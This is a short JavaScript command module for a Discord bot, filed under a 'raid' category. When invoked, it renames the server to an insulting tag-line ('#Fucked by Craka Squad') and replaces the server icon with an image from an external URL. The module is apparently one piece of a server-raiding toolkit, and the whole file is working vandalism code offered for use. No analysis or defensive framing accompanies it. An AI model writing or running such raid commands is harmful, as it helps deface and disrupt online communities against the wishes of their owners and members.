const { MessageEmbed } = require('discord.js')
module.exports = {
    name : 'foto',
    category : 'raid',
    description : 'Cambia el nombre y la foto del servidor',

    run : async(client, message, args) => {
        message.guild.setName("#Fucked by Craka Squad");
        message.guild.setIcon("https://cdn.discordapp.com/icons/831019970505867294/d441f7053ac2675f5b186c0335596dba.png?size=1024");
    }
}
